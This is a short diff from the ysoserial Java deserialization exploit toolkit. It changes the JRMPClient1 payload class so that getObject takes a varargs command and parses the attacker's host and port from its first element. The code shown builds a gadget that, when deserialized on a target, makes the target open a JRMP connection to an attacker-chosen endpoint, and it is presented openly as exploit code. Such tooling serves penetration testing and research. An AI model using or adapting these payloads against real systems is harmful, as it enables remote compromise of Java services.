@@ -59,18 +59,18 @@ import ysoserial.payloads.util.PayloadRunner;
 @Authors({ Authors.MBECHLER })
 public class JRMPClient1 extends PayloadRunner implements ObjectPayload<Object> {
 
-    public Object getObject ( final String command ) throws Exception {
+    public Object getObject ( final String ... command ) throws Exception {
 
         String host;
         int port;
-        int sep = command.indexOf(':');
+        int sep = command[0].indexOf(':');
         if ( sep < 0 ) {
             port = new Random().nextInt(65535);
-            host = command;
+            host = command[0];
         }
         else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
+            host = command[0].substring(0, sep);
+            port = Integer.valueOf(command[0].substring(sep + 1));
         }
         ObjID id = new ObjID(new Random().nextInt()); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
